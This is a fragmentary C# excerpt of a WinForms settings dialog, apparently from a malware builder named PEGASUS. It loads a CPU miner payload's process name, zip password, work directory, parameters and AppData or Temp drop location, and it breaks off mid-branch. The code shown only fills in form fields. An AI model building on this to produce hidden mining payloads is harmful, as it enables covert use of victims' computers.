...
namespace PEGASUS.Design
{
	public class CPUClientSettings : Form
	{
		...
		public CPUClientSettings()
		{
			...
			metroSetTextBox4.Text = global::PEGASUS.Properties.Settings.Default.cpu_Proc;
			metroSetTextBox1.Text = global::PEGASUS.Properties.Settings.Default.cpu_zipPassword;
			metroSetTextBox3.Text = global::PEGASUS.Properties.Settings.Default.cpu_workDir;
			metroSetTextBox2.Text = global::PEGASUS.Properties.Settings.Default.cpu_Parametrs;
			if (global::PEGASUS.Properties.Settings.Default.cpu_sysDir == "LOCAL")
			{
				metroSetComboBox1.Text = "C:/Users/AppData/Local";
			}
			else if (global::PEGASUS.Properties.Settings.Default.cpu_sysDir == "TEMP")
			{
				metroSetComboBox1.Text = "C:/Users/AppData/Local/Temp";
			}
			else if (global::PEGASUS.Properties.Settings.Default.cpu_sysDir == "ROAMING")
			{
				metroSetComboBox1.Text = "C:/Users/AppData/Roaming";
			}
			if (File.Exists(global::PEGASUS.Properties.Settings.Default.cpuFile))
			{
				metroSetButton2.Text = global::PEGASUS.Properties.Settings.Default.cpuFile;
				metroSetButton2.Tag = global::PEGASUS.Properties.Settings.Default.cpuFile;
				IsOK = true;
			}
			else
			{
